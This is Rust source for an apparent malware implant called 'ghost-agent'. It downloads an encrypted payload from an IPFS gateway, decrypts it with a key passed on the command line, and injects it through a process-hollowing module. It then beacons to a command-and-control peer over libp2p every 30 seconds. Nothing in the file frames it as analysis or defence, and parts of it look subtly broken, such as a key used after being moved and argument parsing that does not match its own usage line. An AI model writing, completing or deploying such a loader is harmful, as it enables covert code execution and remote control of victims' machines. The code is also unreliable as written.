use libp2p::{identity, PeerId, Multiaddr, Swarm, Transport, noise, yamux, core::upgrade};
use std::error::Error;
use tokio::time::{sleep, Duration};
use reqwest;
use aes_gcm::{Aes256Gcm, Key, Nonce};
use aes_gcm::aead::{Aead, NewAead};
use rand::Rng;

mod hollowing;
mod reconnect;

#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let args: Vec<String> = std::env::args().collect();
    if args.len() < 4 {
        eprintln!("Usage: ghost-agent.exe -key <hex> -core <multiaddr> -ipfs <hash>");
        return Ok(());
    }
    let key_hex = &args[1];
    let core_addr: Multiaddr = args[2].parse()?;
    let ipfs_hash = &args[3];

    let key_bytes = hex::decode(key_hex)?;
    let cipher = Aes256Gcm::new(Key::from_slice(&key_bytes));

   
    let encrypted = reqwest::get(&format!("http://localhost:8080/ipfs/{}", ipfs_hash))
        .await?
        .bytes()
        .await?;
    
    let nonce_bytes = &encrypted[0..12];
    let payload = &encrypted[12..];
    let nonce = Nonce::from_slice(nonce_bytes);
    let decrypted = cipher.decrypt(nonce, payload)?;

    
    hollowing::inject(&decrypted)?;

    
    let local_key = identity::Keypair::generate_ed25519();
    let transport = libp2p::development_transport(local_key).await?;
    let behaviour = reconnect::ReconnectBehaviour::default();
    let mut swarm = Swarm::new(transport, behaviour, local_key.public().to_peer_id());
    swarm.listen_on("/ip4/0.0.0.0/tcp/0".parse()?)?;

    
    loop {
        if let Err(e) = swarm.dial(core_addr.clone()) {
            eprintln!("dial error: {}", e);
        }
        sleep(Duration::from_secs(30)).await;
    }
}
